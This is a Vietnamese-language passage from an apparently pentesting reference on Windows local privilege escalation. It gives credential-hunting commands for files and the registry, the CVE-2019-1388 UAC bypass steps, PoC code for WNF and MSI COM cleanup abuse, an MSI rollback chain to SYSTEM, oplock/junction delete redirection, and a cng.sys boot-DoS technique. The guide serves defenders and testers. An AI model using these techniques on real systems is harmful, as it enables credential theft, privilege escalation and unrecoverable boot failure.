### **Tìm kiếm mật khẩu tổng quát trong tệp và registry**

**Tìm kiếm nội dung tệp**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Tìm kiếm tệp có tên cụ thể**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Tìm kiếm registry để tìm tên khóa và mật khẩu**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Công cụ tìm kiếm mật khẩu

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **là một plugin msf** tôi đã tạo plugin này để **tự động thực thi mọi POST module của metasploit tìm kiếm thông tin xác thực** trên máy nạn nhân.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) tự động tìm kiếm mọi tệp chứa mật khẩu được đề cập trên trang này.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) là một công cụ tuyệt vời khác để trích xuất mật khẩu từ hệ thống.

Công cụ [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) tìm kiếm **session**, **tên người dùng** và **mật khẩu** của một số công cụ lưu dữ liệu này dưới dạng văn bản thuần (PuTTY, WinSCP, FileZilla, SuperPuTTY và RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Hãy tưởng tượng **một process chạy dưới quyền SYSTEM mở một process mới** (`OpenProcess()`) với **quyền truy cập đầy đủ**. Process đó **cũng tạo một process mới** (`CreateProcess()`) **với quyền thấp hơn nhưng kế thừa tất cả handle đang mở của process chính**.\
Sau đó, nếu bạn có **quyền truy cập đầy đủ vào process có quyền thấp**, bạn có thể lấy **handle đang mở tới process có quyền cao được tạo bằng** `OpenProcess()` và **inject shellcode**.\
[Đọc ví dụ này để biết thêm thông tin về **cách phát hiện và khai thác lỗ hổng này**.](leaked-handle-exploitation.md)\
[Đọc **bài viết khác này để xem giải thích đầy đủ hơn về cách kiểm tra và lạm dụng các handle đang mở khác của process và thread được kế thừa với nhiều mức quyền khác nhau (không chỉ quyền truy cập đầy đủ)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Các vùng bộ nhớ dùng chung, được gọi là **pipe**, cho phép các process giao tiếp và truyền dữ liệu.

Windows cung cấp tính năng **Named Pipes**, cho phép các process không liên quan chia sẻ dữ liệu, kể cả qua các mạng khác nhau. Cơ chế này tương tự kiến trúc client/server, với các vai trò là **named pipe server** và **named pipe client**.

Khi **client** gửi dữ liệu qua pipe, **server** đã thiết lập pipe có thể **mạo danh** **client**, nếu có quyền **SeImpersonate** cần thiết. Việc xác định được một **process có quyền cao** giao tiếp qua pipe mà bạn có thể giả lập sẽ tạo cơ hội **nâng cao quyền hạn** bằng cách mạo danh process đó khi nó tương tác với pipe bạn đã thiết lập. Hướng dẫn thực hiện kiểu tấn công này có thể tìm thấy [**tại đây**](named-pipe-client-impersonation.md) và [**tại đây**](#from-high-integrity-to-system).

Ngoài ra, công cụ sau cho phép **chặn giao tiếp qua named pipe bằng một công cụ như Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **và công cụ này cho phép liệt kê, xem tất cả các pipe để tìm cơ hội nâng quyền** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Dịch vụ Telephony (TapiSrv) ở chế độ server công khai `\\pipe\\tapsrv` (MS-TRP). Client từ xa đã xác thực có thể lạm dụng đường xử lý sự kiện bất đồng bộ dựa trên mailslot để biến `ClientAttach` thành thao tác **ghi 4 byte tùy ý** vào bất kỳ file hiện có nào mà `NETWORK SERVICE` có quyền ghi, sau đó giành quyền quản trị Telephony và nạp DLL tùy ý dưới danh tính dịch vụ. Quy trình đầy đủ:

- Gọi `ClientAttach` với `pszDomainUser` được đặt thành đường dẫn hiện có có quyền ghi → dịch vụ mở file bằng `CreateFileW(..., OPEN_EXISTING)` và dùng file đó để ghi sự kiện bất đồng bộ.
- Mỗi sự kiện ghi `InitContext` do attacker kiểm soát từ `Initialize` vào handle đó. Đăng ký ứng dụng line bằng `LRegisterRequestRecipient` (`Req_Func 61`), kích hoạt `TRequestMakeCall` (`Req_Func 121`), lấy dữ liệu qua `GetAsyncEvents` (`Req_Func 0`), rồi hủy đăng ký/tắt dịch vụ để lặp lại các lần ghi có thể dự đoán.
- Thêm tài khoản của bạn vào `[TapiAdministrators]` trong `C:\Windows\TAPI\tsec.ini`, kết nối lại, rồi gọi `GetUIDllName` với đường dẫn DLL tùy ý để thực thi `TSPI_providerUIIdentify` dưới danh tính `NETWORK SERVICE`.

Chi tiết hơn:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Khác

### Các phần mở rộng file có thể thực thi nội dung trong Windows

Xem trang **[https://filesec.io/](https://filesec.io/)**

### Lạm dụng Protocol handler / ShellExecute qua trình render Markdown

Các liên kết Markdown có thể nhấp được chuyển đến `ShellExecuteExW` có thể kích hoạt URI handler nguy hiểm (`file:`, `ms-appinstaller:` hoặc bất kỳ scheme nào đã đăng ký) và thực thi file do attacker kiểm soát dưới danh tính người dùng hiện tại. Xem:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Giám sát Command Line để tìm mật khẩu**

Khi có shell dưới danh tính người dùng, có thể có scheduled task hoặc process khác đang chạy và **truyền thông tin xác thực trên command line**. Script bên dưới thu thập command line của process mỗi hai giây, so sánh trạng thái hiện tại với trạng thái trước đó và xuất ra mọi khác biệt.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Đánh cắp mật khẩu từ các tiến trình

## Từ người dùng quyền thấp đến NT\AUTHORITY SYSTEM (CVE-2019-1388) / Bypass UAC

Nếu bạn có quyền truy cập vào giao diện đồ họa (qua console hoặc RDP) và UAC được bật, thì trên một số phiên bản Microsoft Windows, bạn có thể chạy terminal hoặc bất kỳ tiến trình nào khác dưới quyền "NT\AUTHORITY SYSTEM" từ một người dùng không có đặc quyền.

Điều này cho phép bạn đồng thời leo thang đặc quyền và bypass UAC bằng cùng một lỗ hổng. Ngoài ra, không cần cài đặt gì và binary được sử dụng trong quá trình này có chữ ký do Microsoft phát hành.

Một số hệ thống bị ảnh hưởng gồm:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Để khai thác lỗ hổng này, cần thực hiện các bước sau:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Bạn có tất cả các tệp và thông tin cần thiết trong repository GitHub này:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Từ Medium Integrity Level của Administrator lên High Integrity Level / Bypass UAC

Đọc nội dung này để **tìm hiểu về Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Sau đó **đọc nội dung này để tìm hiểu về UAC và các cách bypass UAC:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Đưa Junction của thư mục upload vào thư mục gốc được phục vụ

Một ứng dụng có thể tạo thư mục con upload với tên có thể dự đoán được, ghi tệp có tên do người gọi cung cấp vào đó, rồi xử lý tệp. Nếu người dùng có đặc quyền thấp có thể xóa rồi thay thế thư mục con đó bằng NTFS junction trước khi thao tác ghi phía máy chủ diễn ra, thao tác ghi có thể đi theo junction vào thư mục được web server phục vụ. Một script được đặt ở đó có thể chạy với danh tính của web service nếu server thực thi loại tệp đó. Đây là một ranh giới arbitrary-write đặc thù của ứng dụng; chỉ riêng việc thư mục upload có quyền ghi hoặc tồn tại junction không chứng minh được điều này.

Kiểm tra chính xác cách tạo đường dẫn và thời điểm xử lý trong upload handler, quyền xóa/tạo hiệu lực của người dùng trên thư mục con, ACL hiệu lực của đích đến, liệu tiến trình ghi có đi theo reparse point hay không, và web server có thực thi tệp trong thư mục đích đó hay không. Xác minh riêng danh tính của tiến trình ghi và web server. Việc kiểm kê thụ động có thể hiển thị ACL thư mục và metadata reparse, nhưng không thể xác định hành vi của handler hoặc việc thay junction trong tương lai. Nếu mã được thực thi trong tài khoản dịch vụ, hãy kiểm tra **token của tiến trình thực tế** trước khi xem xét bất kỳ hướng khai thác đặc quyền token riêng biệt nào.

## Dọn dẹp scheduled task đặc quyền được kích hoạt bởi WNF

Một scheduled task từ chối chạy thủ công vẫn có thể để lộ một trigger mà người dùng không có đặc quyền kích hoạt được. Khi kiểm tra task đặc quyền, hãy xuất XML và kiểm tra **tất cả** trigger cùng với DACL, principal và action của task. Cụ thể, `WnfStateChangeTrigger` chỉ định một trạng thái Windows Notification Facility (WNF); nếu trạng thái có thể được bảo vệ đó cho phép người dùng hiện tại publish một bản cập nhật, người dùng có thể gián tiếp khởi chạy task dưới danh tính đã cấu hình, bất kể `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Ví dụ, task Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` chạy dưới quyền SYSTEM, chấp nhận cập nhật trạng thái WNF `7508BCA32C079E41` từ người dùng thông thường, rồi kiểm tra `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` ngay cả khi Recall đã bị tắt.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Để kiểm tra khả năng gọi tới hàm, hãy resolve `ZwUpdateWnfStateData` từ `ntdll.dll`, gửi một bản cập nhật rỗng cho state name dài tám byte, rồi đối chiếu trạng thái trả về với dữ liệu lần chạy gần nhất của task hoặc hoạt động trong Procmon. Probe rút gọn sau đây sử dụng chuỗi byte từ ví dụ về task Recall; hãy thay bằng các byte được export cho task đang kiểm tra.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Biến thao tác dọn dẹp đệ quy thành xóa với quyền cao

Primitive hữu ích không chỉ là trigger, mà là một routine dọn dẹp có quyền cao chấp nhận thư mục do attacker kiểm soát. Theo dõi thao tác từ bước liệt kê đến thay đổi cuối cùng: phát hiện profile/session, các mục con được chọn bằng wildcard, `SHCreateItemFromParsingName` và `IFileOperation::DeleteItem` là những dấu hiệu mạnh cho thấy một pathname đã được kiểm tra trước đó sẽ được duyệt đệ quy về sau. Nếu các mục con không được mở tương đối với handle thư mục đáng tin cậy và xác thực trước khi xóa, attacker có thể thay đổi cách phân giải giữa lúc liệt kê và lúc sử dụng.<sup>[[43]](#references)</sup>

Kết hợp WNF trigger với kỹ thuật [thay thế oplock, junction và Object Manager symlink](#from-folder-contents-delete-to-system-eop) được mô tả bên dưới: oplock tạm dừng chương trình dọn dẹp sau khi nó chọn mục con hợp lệ, trong khi ancestor có thể ghi bị thay thế để thao tác xóa có quyền cao khi tiếp tục sẽ phân giải qua `\RPC Control` đến target được bảo vệ. Trong chuỗi Recall, cách này dẫn đến thao tác xóa `C:\Config.Msi` bằng quyền SYSTEM, cần thiết cho kỹ thuật MSI rollback đã được ghi lại.<sup>[[31]](#references)[[43]](#references)</sup>

### Các mục con lồng nhau vượt qua những bản sửa lỗi reparse point hời hợt

Chỉ xác thực root do attacker kiểm soát và mục con trực tiếp của nó không đủ để bảo vệ thao tác xóa đệ quy dựa trên pathname. Giữ các đối tượng đã kiểm tra đó ở trạng thái hợp lệ rồi chuyển việc thay thế junction/oplock xuống một mục con sâu hơn bên dưới chúng; `IFileOperation::DeleteItem` cuối cùng sẽ tiếp cận mục con chưa được xác thực và đi theo target mới của nó. CVE-2026-20941 thuộc chính lớp lỗi này: bản vá Recall đầu tiên xác thực `UKP` và thư mục có tên dạng GUID nhưng vẫn giữ thao tác xóa đệ quy cũ.<sup>[[43]](#references)</sup>

Mẫu an toàn là mở **mọi mục con** tương đối với handle thư mục đã đáng tin cậy, lấy và xác minh đường dẫn/đối tượng cuối cùng đã phân giải, rồi áp dụng trạng thái xóa lên handle đã xác minh đó. Đừng xác thực một tiền tố rồi quay lại thao tác xóa đệ quy dựa trên path. Khi review bản vá, cũng hãy kiểm tra cấu trúc tại vị trí gọi thực tế: trong trường hợp này, kiểm tra runtime `OBJECT_ATTRIBUTES` tại `NtCreateFile` cho thấy `RootDirectory` khác null và tên `{GUID}\\secure_file.lock` là đường dẫn tương đối, bác bỏ kết quả decompiler gây hiểu nhầm rằng có một primitive `FILE_DELETE_ON_CLOSE` thứ hai.<sup>[[43]](#references)</sup>

## Từ Xóa/Di chuyển/Đổi tên Thư mục Tùy ý đến SYSTEM EoP

Kỹ thuật được mô tả [**trong bài blog này**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), cùng mã khai thác [**có tại đây**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Cuộc tấn công về cơ bản lợi dụng tính năng rollback của Windows Installer để thay thế các tệp hợp lệ bằng tệp độc hại trong quá trình gỡ cài đặt. Để thực hiện, attacker cần tạo một **MSI installer độc hại** dùng để chiếm quyền kiểm soát thư mục `C:\Config.Msi`. Sau đó, Windows Installer sẽ dùng thư mục này để lưu các tệp rollback trong quá trình gỡ cài đặt những gói MSI khác; các tệp rollback này sẽ bị sửa đổi để chứa payload độc hại.

### Chèn đường dẫn dọn dẹp COM của Windows Installer (CVE-2025-27727)

Client có quyền thấp có thể truy cập dịch vụ `msiexec.exe` chạy bằng SYSTEM thông qua đối tượng COM `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Qua reverse engineering, các lời gọi `IMsiServer` liên quan được xác định là `MsiBeginTransactionW` tại offset vtable `0xA0`, `SetEEUIDirectoryAndFilter` tại `0xC8` và `CleanupTempPackages` tại `0x50`. Các tên và offset này được xác định bằng reverse engineering và có thể khác nhau giữa các bản build.<sup>[[41]](#references)</sup>

Đối với người dùng không phải administrator, `SetEEUIDirectoryAndFilter` chỉ impersonate caller trong lúc mở path được cung cấp với `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` và `FILE_FLAG_OPEN_REPARSE_POINT`. Điều này chứng minh caller có thể xóa thư mục và tránh đi theo reparse point, nhưng **không** ràng buộc đối tượng tệp đã kiểm tra với thao tác dọn dẹp về sau, cũng không chứng minh rằng Windows Installer đã tạo ra nó.<sup>[[41]](#references)</sup>

Sau `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` lên lịch path như một thư mục bất kể đối số filter của caller. Service ghi một giá trị `REG_DWORD` có tên vào `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: tên giá trị là path do caller kiểm soát, còn dữ liệu `0x00000002` là cờ thư mục. Sau đó, `CleanupTempPackages(NULL, FALSE)` gọi thẳng vào quy trình dọn dẹp. Worker chạy với quyền cao liệt kê các giá trị registry và chuyển các mục thư mục cho `FDeleteFolder` đệ quy mà không kiểm tra nguồn gốc path. Nếu thao tác gỡ bỏ thông thường thất bại, code cũng gọi `LockdownPath`, xóa các thuộc tính tệp rồi thử lại.<sup>[[41]](#references)</sup>

Trình tự lời gọi tối thiểu được khôi phục từ `msi.dll` là:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Primitive hữu ích ở đây là tái sử dụng đường dẫn thay vì chuyển hướng bằng junction. Đăng ký một `C:\Config.Msi` do attacker tạo, xóa nó, rồi để Windows Installer tạo lại cùng đường dẫn đó sau này với dữ liệu rollback được bảo vệ. Quá trình dọn dẹp tin vào tên `TempPackages` cũ và xóa thư mục mới với quyền SYSTEM. Cách này vượt qua ranh giới bảo vệ dự kiến của `FILE_FLAG_OPEN_REPARSE_POINT` và biện pháp giảm thiểu dựa trên độ tin cậy của chuyển hướng, vì không cần reparse point.<sup>[[41]](#references)</sup>

Primitive xóa này phù hợp với chuỗi rollback bên dưới: giữ lại bản ghi `Installer\Folders` riêng biệt, xóa `C:\Config.Msi` được bảo vệ, tạo lại thư mục với NULL DACL, rồi giữ một handle được cấp `WRITE_DAC` trước khi installer siết chặt DACL. Handle đã mở sẵn có thể khôi phục DACL dễ dãi bằng `NtSetSecurityObject`, sau đó có thể thay thế `.rbs` được tạo ra trước khi rollback tiếp tục.<sup>[[41]](#references)</sup>

Microsoft đã sửa lỗi này bằng cách ngăn `CMsiTransaction::SetEEUIDirectoryAndFilter` gọi `ScheduleFileOrFolderDelete` khi bật feature gate mới. Lệnh gọi COM vẫn có thể trả về thành công, nhưng đường dẫn do attacker kiểm soát sẽ không còn được thêm vào `TempPackages`. Hãy áp dụng các bản cập nhật bảo mật Windows tháng 4 năm 2025 thay vì dùng việc method trả về thành công làm phép thử bản vá.<sup>[[41]](#references)[[42]](#references)</sup>

Kỹ thuật được tóm tắt như sau:

1. **Giai đoạn 1 – Chuẩn bị cho việc chiếm quyền (để `C:\Config.Msi` trống)**

- Bước 1: Cài đặt MSI
    - Tạo một `.msi` cài đặt một file vô hại (ví dụ: `dummy.txt`) vào một thư mục có thể ghi (`TARGETDIR`).
    - Đánh dấu installer là **"UAC Compliant"** để **người dùng không phải admin** có thể chạy nó.
    - Giữ một **handle** mở tới file sau khi cài đặt.

- Bước 2: Bắt đầu gỡ cài đặt
    - Gỡ cài đặt cùng `.msi`.
    - Tiến trình gỡ cài đặt bắt đầu chuyển file vào `C:\Config.Msi` và đổi tên chúng thành các file `.rbf` (bản sao lưu rollback).
    - **Thăm dò handle file đang mở** bằng `GetFinalPathNameByHandle` để phát hiện khi file trở thành `C:\Config.Msi\<random>.rbf`.

- Bước 3: Đồng bộ hóa tùy chỉnh
    - `.msi` có một **custom uninstall action (`SyncOnRbfWritten`)** để:
        - Báo hiệu khi `.rbf` đã được ghi.
        - Sau đó **chờ** một event khác trước khi tiếp tục gỡ cài đặt.

- Bước 4: Ngăn xóa `.rbf`
    - Khi nhận được tín hiệu, **mở file `.rbf`** mà không có `FILE_SHARE_DELETE` — việc này **ngăn file bị xóa**.
    - Sau đó **gửi tín hiệu phản hồi** để quá trình gỡ cài đặt hoàn tất.
    - Windows Installer không thể xóa `.rbf`; do không thể xóa toàn bộ nội dung, nó **không xóa `C:\Config.Msi`**.

- Bước 5: Xóa `.rbf` thủ công
    - Bạn (attacker) tự xóa file `.rbf`.
    - Lúc này, **`C:\Config.Msi` đã trống**, sẵn sàng bị chiếm quyền.

> Tại thời điểm này, **kích hoạt lỗ hổng xóa thư mục tùy ý ở cấp SYSTEM** để xóa `C:\Config.Msi`.

2. **Giai đoạn 2 – Thay thế rollback script bằng script độc hại**

- Bước 6: Tạo lại `C:\Config.Msi` với ACL yếu
    - Tự tạo lại thư mục `C:\Config.Msi`.
    - Đặt **DACL yếu** (ví dụ: Everyone:F) và **giữ một handle mở** với quyền `WRITE_DAC`.

- Bước 7: Chạy một lượt cài đặt khác
    - Cài đặt lại `.msi` với:
        - `TARGETDIR`: Vị trí có thể ghi.
        - `ERROROUT`: Một biến kích hoạt lỗi bắt buộc.
    - Lượt cài đặt này sẽ được dùng để kích hoạt **rollback** lần nữa, quá trình này đọc `.rbs` và `.rbf`.

- Bước 8: Theo dõi `.rbs`
    - Dùng `ReadDirectoryChangesW` để theo dõi `C:\Config.Msi` cho đến khi xuất hiện `.rbs` mới.
    - Ghi lại tên file.

- Bước 9: Đồng bộ trước khi rollback
    - `.msi` có một **custom install action (`SyncBeforeRollback`)** để:
        - Báo hiệu một event khi `.rbs` được tạo.
        - Sau đó **chờ** trước khi tiếp tục.

- Bước 10: Áp dụng lại ACL yếu
    - Sau khi nhận event `.rbs created`:
        - Windows Installer **áp dụng lại ACL mạnh** cho `C:\Config.Msi`.
        - Nhưng vì bạn vẫn có handle với quyền `WRITE_DAC`, bạn có thể **áp dụng lại ACL yếu**.

> ACL chỉ được **kiểm tra khi mở handle**, vì vậy bạn vẫn có thể ghi vào thư mục.

- Bước 11: Đưa vào `.rbs` và `.rbf` giả
    - Ghi đè file `.rbs` bằng một **rollback script giả** yêu cầu Windows:
        - Khôi phục file `.rbf` của bạn (DLL độc hại) vào một **vị trí đặc quyền** (ví dụ: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Đưa vào `.rbf` giả chứa **DLL payload độc hại ở cấp SYSTEM**.

- Bước 12: Kích hoạt rollback
    - Gửi tín hiệu sync event để installer tiếp tục.
    - Một **custom action loại 19 (`ErrorOut`)** được cấu hình để **cố ý làm cài đặt thất bại** tại một thời điểm đã biết.
    - Việc này khiến **rollback bắt đầu**.

- Bước 13: SYSTEM cài đặt DLL của bạn
    - Windows Installer:
        - Đọc `.rbs` độc hại của bạn.
        - Sao chép DLL `.rbf` của bạn vào vị trí đích.
    - Giờ bạn có **DLL độc hại nằm trong đường dẫn được SYSTEM tải**.

- Bước cuối: Thực thi mã SYSTEM
    - Chạy một **binary tự động nâng quyền đáng tin cậy** (ví dụ: `osk.exe`) để tải DLL mà bạn đã chiếm quyền.
    - **Thế là xong**: Mã của bạn được thực thi **với quyền SYSTEM**.


### Từ xóa/di chuyển/đổi tên file tùy ý đến SYSTEM EoP

Kỹ thuật MSI rollback chính (ở trên) giả định rằng bạn có thể xóa **toàn bộ thư mục** (ví dụ: `C:\Config.Msi`). Nhưng nếu lỗ hổng của bạn chỉ cho phép **xóa file tùy ý** thì sao?

Bạn có thể khai thác **cấu trúc nội bộ NTFS**: mọi thư mục đều có một alternate data stream ẩn tên là:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Stream này lưu trữ **metadata chỉ mục** của thư mục.

Vì vậy, nếu bạn **xóa stream `::$INDEX_ALLOCATION`** của một thư mục, NTFS sẽ **xóa toàn bộ thư mục** khỏi hệ thống tệp.

Bạn có thể thực hiện việc này bằng các API xóa tệp tiêu chuẩn như:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Mặc dù bạn đang gọi API xóa *file*, API này **xóa chính folder đó**.

### Từ xóa nội dung folder đến SYSTEM EoP
Điều gì xảy ra nếu primitive của bạn không cho phép xóa file/folder tùy ý, nhưng **cho phép xóa *nội dung* của một folder do attacker kiểm soát**?

1. Bước 1: Tạo một folder và file mồi
- Tạo: `C:\temp\folder1`
- Bên trong folder đó: `C:\temp\folder1\file1.txt`

2. Bước 2: Đặt một **oplock** lên `file1.txt`
- Oplock **tạm dừng quá trình thực thi** khi một process có đặc quyền cố xóa `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Bước 3: Kích hoạt process SYSTEM (ví dụ: `SilentCleanup`)
- Process này quét các thư mục (ví dụ: `%TEMP%`) và cố gắng xóa nội dung bên trong.
- Khi process đến `file1.txt`, **oplock được kích hoạt** và chuyển quyền điều khiển cho callback của bạn.

4. Bước 4: Bên trong callback của oplock – chuyển hướng thao tác xóa

- Tùy chọn A: Di chuyển `file1.txt` sang nơi khác
    - Thao tác này làm trống `folder1` mà không phá vỡ oplock.
    - Đừng xóa trực tiếp `file1.txt` — làm vậy sẽ giải phóng oplock quá sớm.

- Tùy chọn B: Chuyển `folder1` thành một **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Tùy chọn C: Tạo một **symlink** trong `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Điều này nhắm vào internal stream của NTFS lưu metadata thư mục — xóa nó sẽ xóa thư mục.

5. Step 5: Nhả oplock
- Tiến trình SYSTEM tiếp tục và cố gắng xóa `file1.txt`.
- Nhưng lúc này, do junction + symlink, thực tế nó đang xóa:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Kết quả**: `C:\Config.Msi` bị SYSTEM xóa.

### Từ khả năng tạo thư mục tùy ý đến DoS vĩnh viễn

Khai thác một primitive cho phép bạn **tạo thư mục tùy ý với quyền SYSTEM/admin** — ngay cả khi **bạn không thể ghi file** hoặc **thiết lập quyền yếu**.

Tạo một **thư mục** (không phải file) có tên của một **driver Windows quan trọng**, ví dụ:
```
C:\Windows\System32\cng.sys
```

- Đường dẫn này thường tương ứng với driver kernel-mode `cng.sys`.
- Nếu bạn **tạo sẵn đường dẫn này dưới dạng thư mục**, Windows sẽ không tải được driver thực khi khởi động.
- Sau đó, Windows cố tải `cng.sys` trong quá trình khởi động.
- Windows thấy thư mục, **không thể phân giải driver thực** và **bị crash hoặc dừng khởi động**.
- **Không có phương án dự phòng** và **không thể khôi phục** nếu không có can thiệp từ bên ngoài (ví dụ: sửa lỗi khởi động hoặc truy cập ổ đĩa).

### Từ đường dẫn log/sao lưu có đặc quyền + symlink OM đến ghi đè file tùy ý / DoS khởi động

Khi một **dịch vụ có đặc quyền** ghi log/xuất dữ liệu vào đường dẫn lấy từ **cấu hình có thể ghi**, hãy chuyển hướng đường dẫn đó bằng **symlink Object Manager + điểm gắn kết NTFS** để biến thao tác ghi có đặc quyền thành ghi đè tùy ý (ngay cả **khi không có SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Yêu cầu**
- Tệp cấu hình lưu đường dẫn đích có thể được attacker ghi (ví dụ: `%ProgramData%\...\.ini`).
- Có khả năng tạo điểm gắn kết đến `\RPC Control` và symlink file OM (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Có thao tác đặc quyền ghi vào đường dẫn đó (log, bản xuất, báo cáo).

**Chuỗi ví dụ**
1. Đọc cấu hình để lấy đường dẫn log đặc quyền, ví dụ: `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` trong `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Chuyển hướng đường dẫn mà không cần quyền admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Chờ thành phần có đặc quyền ghi log (ví dụ: quản trị viên kích hoạt "gửi SMS thử nghiệm"). Lúc này, dữ liệu sẽ được ghi vào `C:\Windows\System32\cng.sys`.
4. Kiểm tra mục tiêu đã bị ghi đè (bằng hex/PE parser) để xác nhận dữ liệu bị hỏng; khởi động lại sẽ buộc Windows tải driver đã bị can thiệp → **DoS vòng lặp khởi động**. Cách này cũng áp dụng cho mọi tệp được bảo vệ mà một dịch vụ có đặc quyền sẽ mở để ghi.

> `cng.sys` thường được tải từ `C:\Windows\System32\drivers\cng.sys`, nhưng nếu có bản sao ở `C:\Windows\System32\cng.sys`, Windows có thể thử tải bản sao đó trước, khiến nó trở thành đích DoS đáng tin cậy để ghi dữ liệu bị hỏng.



## **Từ High Integrity đến System**

### **Dịch vụ mới**

Nếu bạn đang chạy trong một tiến trình High Integrity, **đường dẫn đến SYSTEM** có thể dễ dàng đạt được chỉ bằng cách **tạo và thực thi một dịch vụ mới**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
